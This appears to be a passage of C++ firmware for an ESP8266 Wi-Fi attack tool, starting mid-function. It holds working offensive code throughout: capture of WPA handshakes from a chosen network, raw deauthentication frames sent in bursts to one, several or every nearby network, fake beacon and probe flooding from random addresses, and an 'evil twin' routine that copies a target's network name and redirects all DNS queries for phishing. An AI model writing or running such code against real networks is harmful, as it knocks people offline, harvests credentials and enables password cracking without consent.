OP-AMINUL-FF/OPX_my_demon/NETHERCAP_ESP8266/attacks.h
  // --- EAPOL / WPA Handshake Detection (data frame with EAPOL ethertype) ---
  bool isData = (frameType == 0x08) || (frameType == 0x88); // data or QoS data
  if (isData && handshakeCaptureActive && len >= 36) {
    int llcOffset = 24;
    if ((buf[0] & 0x8C) == 0x88) llcOffset = 26; // QoS data
    if ((buf[0] & 0x04) == 0x04) llcOffset += 4; // HT control
    
    if (len >= (unsigned)(llcOffset + 10)) {
      uint16_t etherType = (uint16_t)buf[llcOffset + 6] << 8 | buf[llcOffset + 7];
      if (etherType == ETHER_TYPE_EAPOL) {
        uint8_t eapolType = buf[llcOffset + 8 + 1]; // EAPOL frame type
        uint8_t *pBSSID = &buf[16]; // Address 3 = BSSID
        uint8_t *pClient = &buf[10]; // Address 2 = transmitter (TA)
        
        if (memcmp(pBSSID, handshakeTargetBSSID, 6) == 0 || memcmp(pClient, handshakeTargetBSSID, 6) == 0) {
          uint8_t msgType = buf[llcOffset + 10 + 6 + 1]; // Key Info (Message type in EAPOL-Key)
          
          bool found = false;
          for (int j = 0; j < eapolCount && j < EAPOL_MAX; j++) {
            if (memcmp(eapolLog[j].clientMAC, pClient, 6) == 0 && eapolLog[j].messageType == msgType) {
              eapolLog[j].time = millis();
              found = true;
              break;
            }
          }
          
          if (!found && eapolCount < EAPOL_MAX) {
            memcpy(eapolLog[eapolCount].bssid, pBSSID, 6);
            memcpy(eapolLog[eapolCount].clientMAC, pClient, 6);
            eapolLog[eapolCount].messageType = msgType;
            eapolLog[eapolCount].time = millis();
            int copyLen = len;
            if (copyLen > 256) copyLen = 256;
            eapolLog[eapolCount].rawLen = copyLen;
            memcpy(eapolLog[eapolCount].rawData, buf, copyLen);
            eapolCount++;
            
            String clientStr = bytesToStr(pClient, 6);
            addLog("EAPOL msg" + String(msgType) + " from " + clientStr, LOG_WARN);
            
            if (eapolCount >= 4) {
              handshakeComplete = true;
              handshakeCaptureActive = false;
              saveHandshakeBinary();
              addLog("WPA handshake CAPTURED for target!", LOG_WARN);
            }
          }
        }
      }
    }
  }
}

// --- Client Discovery from Probe Requests ---
void updateClientList(uint8_t* mac, uint8_t* bssid, int ch) {
  for (int i = 0; i < clientCount; i++) {
    if (memcmp(clientList[i].mac, mac, 6) == 0) {
      clientList[i].time = millis();
      return;
    }
  }
  if (clientCount < CLIENT_MAX) {
    memcpy(clientList[clientCount].mac, mac, 6);
    memcpy(clientList[clientCount].bssid, bssid, 6);
    clientList[clientCount].ch = ch;
    clientList[clientCount].time = millis();
    clientCount++;
  }
}

void clearNetworks() {
  for (int i = 0; i < MAX_NETWORKS; i++) {
    networks[i].ssid = "";
    networks[i].ch = 0;
    networks[i].rssi = 0;
    networks[i].encrypted = false;
    networks[i].clients = 0;
    memset(networks[i].bssid, 0, MAC_LEN);
  }
}

String bytesToStr(const uint8_t* b, uint32_t size) {
  String result = "";
  char hex[4];
  for (uint32_t i = 0; i < size; i++) {
    if (i > 0) result += ":";
    snprintf(hex, sizeof(hex), "%02X", b[i]);
    result += hex;
  }
  return result;
}

void performScan() {
  clearNetworks();
  int n = WiFi.scanNetworks(false, true);
  if (n < 0) return;
  int count = 0;
  int heapLimit = MAX_NETWORKS;
  size_t freeHeap = ESP.getFreeHeap();
  if (freeHeap < HEAP_WARNING_THRESHOLD + 4000) {
    heapLimit = 15;
    addLog("Heap-aware scan limited to 15 nets", LOG_WARN);
  } else if (freeHeap < HEAP_WARNING_THRESHOLD + 8000) {
    heapLimit = 24;
  }
  for (int i = 0; i < n && count < heapLimit; i++) {
    String ssid = WiFi.SSID(i);
    if (ssid.length() == 0) continue;
    if (ESP.getFreeHeap() < HEAP_WARNING_THRESHOLD) {
      addLog("Heap critical during scan, stopping early", LOG_ERR);
      break;
    }
    bool dup = false;
    for (int j = 0; j < count; j++) {
      if (memcmp(WiFi.BSSID(i), networks[j].bssid, MAC_LEN) == 0) {
        if (WiFi.RSSI(i) > networks[j].rssi) {
          networks[j].rssi = WiFi.RSSI(i);
          networks[j].ch = WiFi.channel(i);
        }
        dup = true;
        break;
      }
    }
    if (!dup) {
      networks[count].ssid = ssid;
      networks[count].ch = WiFi.channel(i);
      memcpy(networks[count].bssid, WiFi.BSSID(i), MAC_LEN);
      networks[count].rssi = WiFi.RSSI(i);
      uint8_t enc = WiFi.encryptionType(i);
      networks[count].encrypted = (enc != ENC_TYPE_NONE);
      networks[count].wpa3 = (enc == 8);
      networks[count].pmf = (enc == 8);
      if (networks[count].wpa3) {
        addLog("WPA3 net: " + ssid.substring(0, 16) + " (attack limited)", LOG_WARN);
      }
      networks[count].clients = 0;
      count++;
    }
  }
  WiFi.scanDelete();
  heapPressureEvict();
}

String getVendor(const uint8_t* bssid) {
  char vendor[7];
  sprintf(vendor, "%02X:%02X:%02X", bssid[0], bssid[1], bssid[2]);
  return String(vendor);
}

void sendDeauthToAll() {
  for (int i = 0; i < MAX_NETWORKS; i++) {
    if (networks[i].ssid.length() > 0) {
      sendDeauth(networks[i].ch, networks[i].bssid, 30);
    }
  }
}

void sendDeauthMulti() {
  for (int i = 0; i < multiTargetCount; i++) {
    sendDeauth(multiTargets[i].ch, multiTargets[i].bssid, 40);
  }
}

void genRandomMAC(uint8_t* mac) {
  for (int i = 0; i < 6; i++) mac[i] = random(0, 256);
  mac[0] &= 0xFE; // unicast
  mac[0] |= 0x02; // locally administered
}

void sendPreciseDeauth(uint8_t ch, uint8_t* bssid) {
  uint8_t deauthPkt[26] = {
    0xC0, 0x00, 0x00, 0x00,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
    bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
    0x00, 0x00, 0x01, 0x00
  };
  wifi_set_channel(ch);
  for (int i = 0; i < DEAUTH_BURST_COUNT / 2; i++) {
    wifi_send_pkt_freedom(deauthPkt, sizeof(deauthPkt), 0);
    if (i % 10 == 0) yield();
  }
  deauthPkt[0] = 0xA0;
  deauthPkt[4] = bssid[0]; deauthPkt[5] = bssid[1];
  deauthPkt[6] = bssid[2]; deauthPkt[7] = bssid[3];
  deauthPkt[8] = bssid[4]; deauthPkt[9] = bssid[5];
  for (int i = 0; i < DEAUTH_BURST_COUNT / 2; i++) {
    wifi_send_pkt_freedom(deauthPkt, sizeof(deauthPkt), 0);
    if (i % 10 == 0) yield();
  }
  deauthPkts += DEAUTH_BURST_COUNT;
  totalPkts += DEAUTH_BURST_COUNT;
}

void sendDeauth(uint8_t ch, uint8_t* bssid, int burstCount = DEAUTH_BURST_COUNT) {
  uint8_t deauthPacket[26] = {
    0xC0, 0x00, 0x00, 0x00,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
    bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
    0x00, 0x00, 0x01, 0x00
  };
  wifi_set_channel(ch);
  for (int i = 0; i < burstCount / 2; i++) {
    wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0);
    if (i % 15 == 0) yield();
  }
  deauthPacket[0] = 0xA0;
  deauthPacket[4] = bssid[0]; deauthPacket[5] = bssid[1];
  deauthPacket[6] = bssid[2]; deauthPacket[7] = bssid[3];
  deauthPacket[8] = bssid[4]; deauthPacket[9] = bssid[5];
  for (int i = 0; i < burstCount / 2; i++) {
    wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0);
    if (i % 15 == 0) yield();
  }
  deauthPkts += burstCount;
  totalPkts += burstCount;
}

void sendBeacon(uint8_t ch, String ssid, uint8_t* bssid, int burst = BEACON_BURST_COUNT) {
  uint8_t ssidLen = ssid.length();
  if (ssidLen > SSID_MAX_LEN) ssidLen = SSID_MAX_LEN;
  uint8_t beaconPacket[128] = {0};
  beaconPacket[0] = 0x80; beaconPacket[1] = 0x00;
  beaconPacket[2] = 0x00; beaconPacket[3] = 0x00;
  memcpy(&beaconPacket[4], bssid, MAC_LEN);
  memcpy(&beaconPacket[10], bssid, MAC_LEN);
  memcpy(&beaconPacket[16], bssid, MAC_LEN);
  beaconPacket[22] = 0x00; beaconPacket[23] = 0x00;
  beaconPacket[24] = 0x01; beaconPacket[25] = 0x08;
  beaconPacket[26] = 0x02; beaconPacket[27] = 0x04;
  beaconPacket[28] = 0x0B; beaconPacket[29] = 0x16;
  beaconPacket[30] = 0x0C; beaconPacket[31] = 0x12;
  beaconPacket[32] = 0x24; beaconPacket[33] = 0x30;
  beaconPacket[34] = 0x48; beaconPacket[35] = 0x60;
  beaconPacket[36] = 0x6C;
  beaconPacket[37] = 0x00; beaconPacket[38] = ssidLen;
  for (int i = 0; i < ssidLen; i++) beaconPacket[39 + i] = ssid.charAt(i);
  int pktLen = 39 + ssidLen;
  wifi_set_channel(ch);
  for (int i = 0; i < burst; i++) {
    wifi_send_pkt_freedom(beaconPacket, pktLen, 0);
    if (i % 5 == 0) yield();
  }
  beaconPkts += burst;
  totalPkts += burst;
}

void sendProbe(String ssid, int burst = PROBE_BURST_COUNT) {
  uint8_t sLen = ssid.length();
  if (sLen > SSID_MAX_LEN) sLen = SSID_MAX_LEN;
  uint8_t tmpMAC[6];
  genRandomMAC(tmpMAC);
  uint8_t probePacket[60] = {0};
  probePacket[0] = 0x40; probePacket[1] = 0x00;
  probePacket[2] = 0x00; probePacket[3] = 0x00;
  probePacket[4] = 0xFF; probePacket[5] = 0xFF;
  probePacket[6] = 0xFF; probePacket[7] = 0xFF;
  probePacket[8] = 0xFF; probePacket[9] = 0xFF;
  memcpy(&probePacket[10], tmpMAC, 6);
  probePacket[16] = 0xFF; probePacket[17] = 0xFF;
  probePacket[18] = 0xFF; probePacket[19] = 0xFF;
  probePacket[20] = 0xFF; probePacket[21] = 0xFF;
  probePacket[22] = 0x00; probePacket[23] = 0x00;
  probePacket[24] = 0x00; probePacket[25] = sLen;
  for (int i = 0; i < sLen; i++) probePacket[26 + i] = ssid.charAt(i);
  int pktLen = 26 + sLen;
  for (int i = 0; i < burst; i++) {
    wifi_send_pkt_freedom(probePacket, pktLen, 0);
    if (i % 10 == 0) yield();
  }
  probePkts += burst;
  totalPkts += burst;
}

void startEvilTwin(DNSServer* dns, String targetSSID) {
  dns->stop();
  WiFi.softAPdisconnect(true);
  delay(100);
  WiFi.softAP(targetSSID.c_str(), NULL, 1, 0, 1);
  delay(100);
  dns->start(DNS_PORT, "*", AP_IP);
  hotspotActive = true;
  phishingStep = 0;
  phishingSessionId = String(random(10000, 99999));
}

